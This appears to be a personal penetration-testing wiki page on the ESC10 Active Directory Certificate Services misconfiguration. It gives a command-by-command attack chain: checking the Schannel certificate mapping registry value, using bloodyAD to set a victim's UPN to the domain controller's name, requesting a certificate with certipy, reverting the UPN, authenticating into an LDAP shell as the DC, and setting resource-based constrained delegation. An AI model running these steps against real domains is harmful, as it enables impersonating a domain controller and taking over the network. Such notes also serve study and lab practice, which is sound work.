# ESC10

[Resource](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

Very hard to find. This is a misconfiguration **on the ADCS server**, not on the certificate template. **Need a shell on the DC** to check/enumerate

## Case 2

If this returns `0x4`, we golden

```cmd
reg query "HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v "CertificateMappingMethods"
```

First, let's change the UPN of a user that we can write to. See [Writable Objects]({{< relref "8. Lateral Movement/AD Enumeration/Writable Objects" >}})

Change it to the `Domain Controller` UPN, it is not a constraint violation since the `DC01$` computer account does not have `userPrincipalName`

```sh
bloodyAD -d domain.name --host dc01.domain.name -u 'user' -p 'password' set object 'victim' userPrincipalName -v 'dc01$'
```

Then, request a certificate of the victim account

```sh
certipy-ad req -u 'victim' -p 'password' -dc-ip 10.10.11.78 -ca Corp-DC01-CA -target dc01.domain.name -template User
```

And change the UPN of the account we control back to original (or random value, doesn't matter)

```sh
bloodyAD -d domain.name --host dc01.domain.name -u 'user' -p 'password' set object 'victim' userPrincipalName -v 'victim@domain.name'
```

Finally, authenticate using the pfx we got. However, we must use the certificate for authentication via Schannel, so `-ldap-shell` is absolutely needed

```sh
certipy-ad auth -pfx "dc01.pfx" -dc-ip '10.10.11.78' -domain 'domain.name' -ldap-shell
```

Then we can do some RBCD. First we have to set RBCD to a computer account that we control

```sh
set_rbcd dc01$ controlled_computer$
```

Then follow these steps to do [RBCD]({{< relref "8. Lateral Movement/DACL Abuse#rbcd" >}})